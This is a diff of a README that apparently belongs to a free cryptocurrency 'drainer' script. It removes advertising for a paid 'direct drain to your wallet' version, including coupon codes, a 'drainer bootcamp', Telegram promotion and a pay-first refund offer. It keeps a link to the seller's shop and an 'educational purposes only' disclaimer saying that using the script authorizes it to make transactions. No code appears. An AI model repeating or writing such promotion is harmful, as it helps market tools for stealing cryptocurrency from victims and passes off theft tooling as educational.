@@ -1,24 +1,5 @@
 ### Read my common myths and scams before buying scripts from anyone on github https://github.com/moneywithbots/Common-scams-and-myths- ###
 
-### List of sellix dealers that i have screened https://github.com/moneywithbots/Sellix-id-verified-script-dealers ###
-
-
-
-### IF YOU WERE DRAINED BY THIS FREE SCRIPT BY AN ERROR MADE BY YOU I WILL OFFER A PARTIAL REFUND ONLY TO BE SENT TO THE ADDRESS DRAINED FROM MUST PURCHASE CHAT PASS TO CONTACT ME THE CHAT PASS AND PARTIAL REFUND WILL BE FOWARDED TO YOU IF YOUR ADDRESS WAS DRAINED BY THIS FREE VERSION ###
-
-!!!!!!!For direct drain to your wallet with no custom smart contract https://moneywithbots.sellix.io/ !!!!!!!!!!!!!
-
-!!!!!!!!! 20 % off for first 100 users and get the drainer bootcamp free with all the info needed too use the scripts 
-coupon code : "OYESHIBgvxdPlpbD"          !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-
-!!!!!!!!! 50 % off for first 10 users and get drainer bootcamp free couponcode: "KlFTxgscMnzwgNFc" !!!!!!!!!!!!!!!!!!
-
-### Telegram group for more info https://t.me/moneywithbotsscripts coupon codes will be posted randomly ###
-
-### Twitter will be posting coupon codes randomly to followers https://twitter.com/moneywithbots ###
-
-### JOIN TELEGRAM GROUP FOR A CHANCE TO WIN DIRECT VERSION FREE WILL DO 1 EVERY WEEK A 250 DOLLAR VALUE FREE https://t.me/moneywithbotsscripts ###
-
 ### Please only use this for educational purposes not too hack others Please use for testing or educational purposes only by using this script you authorize this script to make transactions if you do not feel ok with this script doing that please do not use this script or buy the direct one https://moneywithbots.sellix.io/ ###
 
 
